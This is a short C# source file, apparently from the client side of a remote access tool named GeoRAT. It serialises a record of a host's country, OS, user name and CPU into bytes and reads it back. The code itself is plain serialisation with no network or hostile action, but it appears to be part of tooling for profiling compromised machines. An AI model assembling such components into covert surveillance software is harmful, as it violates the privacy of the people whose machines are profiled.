
using System.IO;
using GeoRAT.Client.PacketStruct.PacketStruct;

namespace GeoRAT.Client.PacketStruct
{
    //This class implements IPacketSerializer interface and serializes Info class into byte[] array 
    //It also deserializes byte[] array back to Info 
    class Serializer : IPacketSerializer
    {

        public  byte[] Serialize(Info i)
        {
            MemoryStream stream = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stream);
            writer.Write(i.Country);
            writer.Write(i.OS);
            writer.Write(i.UserName);
            writer.Write(i.CPU);
            return stream.ToArray();
        }

        public Info Deserialize(byte[] buffer)
        {
            Info i = new Info();
            MemoryStream stream = new MemoryStream(buffer);
            BinaryReader read = new BinaryReader(stream);
            i.Country = read.ReadString();
            i.OS = read.ReadString();
            i.UserName = read.ReadString();
            i.CPU = read.ReadString();
            return i;
        }
    }
}
